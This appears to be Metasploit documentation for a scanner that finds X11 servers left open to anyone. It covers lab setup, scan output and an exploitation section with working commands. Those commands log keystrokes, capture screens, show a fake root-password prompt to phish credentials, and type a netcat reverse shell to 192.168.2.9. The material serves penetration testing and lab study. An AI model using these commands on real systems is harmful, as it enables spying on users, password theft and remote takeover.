## Vulnerable Application

X11 (X Window System) is a graphical windowing system most common on unix/linux, although implementations may be found in windows
with software such as Hummingbird Exceed X Server.  The service can accept connections from any users when misconfigured
which is done with the command `xhost +`.

### Ubuntu 10.04

1. `sudo nano /etc/gdm/gdm.schemas`
2. Find:

    ```
    <schema>
     <key>security/DisallowTCP</key>
     <signature>b</signature>
     <default>true</default>
    </schema>
    ```
  - Change `true` to `false`

3. logout or reboot
4. Verification: ```sudo netstat -antp | grep 6000```

    ```
    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
    ```

5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`

### Ubuntu 12.04, 14.04

1. `sudo nano /etc/lightdm/lightdm.conf`
2. Under the `[SeatDefaults]` area, add:

    ```
    xserver-allow-tcp=true
    allow-guest=true
    ```

3. logout or reboot
4. Verification: ```sudo netstat -antp | grep 6000```

    ```        	
    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
    ```

5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`

### Ubuntu 16.04

  Use the Ubuntu 12.04 instructions, however change `SeatDefaults` to `Seat:*`

### Fedora 15

1. `vi /etc/gdm/custom.conf`
2. Under the `[security]` area, add:

    ```
    DisallowTCP=false
    ```

3. logout/reboot
4. Now, to verify you allow ANYONE to get on X11, type: `xhost +`

### Solaris 10

1. `svccfg -s svc:/application/x11/x11-server setprop options/tcp_listen = true`
2. `svc disable cde-login`
3. `svc enable cde-login`
4. `xhost +`

## Verification Steps

  1. Install and configure X11
  2. Start msfconsole
  3. Do: `use auxiliary/scanner/x11/open_x11`
  4. Do: `set rhosts [IPs]`
  5. Do: `run`

## Scenarios

  A run against Ubuntu 14.04 (192.168.2.75), Ubuntu 16.04 (192.168.2.26), and Solaris 10 (192.168.2.32)

  ```
    msf > use auxiliary/scanner/x11/open_x11 
    msf auxiliary(open_x11) > set rhosts 192.168.2.75 192.168.2.26
    rhosts => 192.168.2.75 192.168.2.26
    msf auxiliary(open_x11) > run
    
    [+] 192.168.2.75:6000     - 192.168.2.75 Open X Server (The X.Org Foundation)
    [*] Scanned 1 of 3 hosts (33% complete)
    [+] 192.168.2.26:6000     - 192.168.2.26 Open X Server (The X.Org Foundation)
    [*] Scanned 2 of 3 hosts (66% complete)
    [+] 192.168.2.32:6000     - 192.168.2.32 Open X Server (Sun Microsystems, Inc.)
    [*] Auxiliary module execution completed
  ```

## Confirming

The following are other industry tools which can also be used.

### [nmap](https://nmap.org/nsedoc/scripts/x11-access.html)

```
# nmap -p 6000 --script=x11-access 192.168.2.26,75

Starting Nmap 7.40 ( https://nmap.org ) at 2017-04-23 13:15 EDT
Nmap scan report for ubuntu-desktop-16 (192.168.2.26)
Host is up (0.0021s latency).
PORT     STATE SERVICE
6000/tcp open  X11
|_x11-access: X server access is granted
MAC Address: 00:0C:29:60:27:F9 (VMware)

Nmap scan report for ubuntu-desktop-14 (192.168.2.75)
Host is up (0.0021s latency).
PORT     STATE SERVICE
6000/tcp open  X11
|_x11-access: X server access is granted
MAC Address: 00:0C:29:0E:C4:6E (VMware)
```

### xdpyinfo

This is one of the standard linux tools to get info on an X display.

```
# xdpyinfo -display 192.168.2.75:0 | head -n 5

name of display:    192.168.2.75:0
version number:    11.0
vendor string:    The X.Org Foundation
vendor release number:    11803000
X.Org version: 1.18.3
```

## Exploitation

Exploiting this mis-configuration has several methods.  The target can have their display viewed, keystrokes logged, and potential keyboard typed.

### Keylogging

To keylog the remote host, we use a tool called [xspy](http://tools.kali.org/sniffingspoofing/xspy)

`xspy -display [ip]:0`

### Screen Monitoring

#### Entire Display

It is possible to monitor the entire display (all windows) and view the content.

 - Take a screenshot: `xwd -root -display [ip]:[display] -out xdump.xdump`
 - View screenshot: `display xdump.xdump` or `xwud -in xdump.xdump`

#### Specific Window

To monitor only a single window (a terminal for instance)

First, we need to determine which windows are available and what their processes are:

 - `xwininfo -tree -root -display [ip]:0`
 
Once you determine which window you want to monitor, you'll want to use the `windowID`.  Now use the application `xwatchwin`

 - `xwatchwin [ip]:0 -w [windowID]`

### Social Engineering

Obviously watching keystrokes is good, but we want to coax the user into providing their password.  We can do this by using xterm to display a login box to the user.

This was tested against Ubuntu 12.04, 14.04, 16.04 and Solaris 10.

1. start `xspy`
2. `xterm -T "Root Permission Required" -display [ip]:0 -e "echo -e -n 'root password: '; read passwd; echo 'Authentication Failure'; echo -e -n 'root password: '; read passwd"`
  - Notice it asks twice for the password incase of a mistyped initial password.  This can also be adjusted to just say password or the real user's username
  - The victim's typed text by the user will not be masked (`*`)

### Direct Exploitation

Use `exploits/unix/x11/x11_keyboard_exec`

### Typing Commands

Similar to the method `exploits/unix/x11/x11_keyboard_exec` uses, its possible to use `xdotool` to run commands on the remote system.

To install `xdotool` on kali simply run `apt-get install xdotool`

Now, you can directly interact by typing commands (which appear on the users screen), an example would be running xterm and launching netcat.

For this scenario we run a simple reverse netcat to 192.168.2.9:80

```
xdotool key alt+F2
xdotool key x t e r m
xdotool key KP_Enter
xdotool key n c space 1 9 2 period 1 6 8 period 2 period 9 space 8 0 space minus e space slash b i n slash b a s h KP_Enter
```